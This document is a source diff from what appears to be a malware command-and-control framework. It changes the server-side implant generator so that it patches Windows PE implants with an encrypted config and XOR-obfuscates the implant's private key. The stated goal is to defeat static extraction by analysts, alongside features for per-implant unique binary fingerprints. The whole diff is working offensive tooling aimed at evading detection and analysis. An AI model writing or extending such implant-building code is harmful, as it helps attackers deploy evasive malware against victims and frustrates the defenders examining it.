@@ -46,6 +46,30 @@ use crate::AppState;
 /// generation. Set this flag to produce per-implant unique binary fingerprints.
 pub const FEATURE_MUTATE: u32 = 0x4000_0000;
 
+// ── Key obfuscation ────────────────────────────────────────────────────────
+
+/// Derive a 32-byte XOR mask from binary header bytes.
+///
+/// Used to obfuscate the implant X25519 private key in `.nyx_cfg` so it is
+/// never stored in plaintext on disk. The implant computes the same mask at
+/// runtime (identical function in `crates/implant-win/src/config_placeholder.rs`)
+/// and reverses the XOR to recover the real key.
+///
+/// Not cryptographic — an analyst who reverse-engineers the algorithm can
+/// still recover the key. But it defeats trivial static extraction.
+///
+/// **IMPORTANT: this function must match the implant-side copy EXACTLY.**
+/// Any change here must be mirrored in config_placeholder.rs.
+fn derive_mask_from_bytes(data: &[u8]) -> [u8; 32] {
+    let mut mask = [0x5Au8; 32]; // non-zero seed
+    for (j, &b) in data.iter().enumerate() {
+        mask[j % 32] ^= b;
+        let idx = (j.wrapping_mul(17).wrapping_add(7)) % 32;
+        mask[idx] = mask[idx].wrapping_add(b).rotate_left((j % 7) as u32);
+    }
+    mask
+}
+
 // ── PE validation ─────────────────────────────────────────────────────────
 
 /// Validate a PE template at load time: MZ magic, PE signature at offset 0x3C,
@@ -390,7 +414,6 @@ pub async fn generate_implant(
         ));
     }
 
-    // Write the patched section.
     let data_len = ct_with_tag.len();
     if data_len > 900 {
         return Err((
@@ -399,23 +422,44 @@ pub async fn generate_implant(
         ));
     }
 
+    // Derive XOR mask before taking &mut section (borrow order).
+    let pe_mask = {
+        let header_len = binary.len().min(4096);
+        derive_mask_from_bytes(&binary[..header_len])
+    };
+
+    // Write the patched section.
     let section = &mut binary[placeholder_offset..placeholder_offset + 1024];
-    // Magic: 0xDEADBEEF
+
+    // Obfuscate the private key: XOR with PE-header-derived mask.
+    let mut obfuscated_priv = implant_priv;
+    for i in 0..32 {
+        obfuscated_priv[i] ^= pe_mask[i];
+    }
+
+    // Layout: [0xDEADBEEF magic 4B] [keying_levels u32 LE 4B] [data_len u16 LE 2B]
+    //         [obfuscated_priv 32B] [nonce 12B] [ct+tag N+16B] [0x00 padding]
+    // Total header before ct: 4 + 4 + 2 + 32 + 12 = 54 bytes
     section[0] = 0xEF;
     section[1] = 0xBE;
     section[2] = 0xAD;
     section[3] = 0xDE;
-    // Data length (u16 LE)
-    section[4] = (data_len as u16) as u8;
-    section[5] = ((data_len as u16) >> 8) as u8;
-    // Implant private key (plaintext, 32B) at offset 6
-    section[6..38].copy_from_slice(&implant_priv);
-    // Config nonce (12B) at offset 38
-    section[38..50].copy_from_slice(&config_nonce);
-    // Encrypted config + tag at offset 50
-    section[50..50 + data_len].copy_from_slice(&ct_with_tag);
+    // keying_levels (u32 LE at bytes 4-7)
+    section[4] = (req.keying) as u8;
+    section[5] = ((req.keying) >> 8) as u8;
+    section[6] = ((req.keying) >> 16) as u8;
+    section[7] = ((req.keying) >> 24) as u8;
+    // data_len (u16 LE at bytes 8-9)
+    section[8] = (data_len as u16) as u8;
+    section[9] = ((data_len as u16) >> 8) as u8;
+    // Obfuscated private key (32B at bytes 10-41)
+    section[10..42].copy_from_slice(&obfuscated_priv);
+    // Config nonce (12B at bytes 42-53)
+    section[42..54].copy_from_slice(&config_nonce);
+    // Encrypted config + tag at byte 54
+    section[54..54 + data_len].copy_from_slice(&ct_with_tag);
     // Zero-pad the rest
-    for b in &mut section[50 + data_len..] {
+    for b in &mut section[54 + data_len..] {
         *b = 0;
     }
 
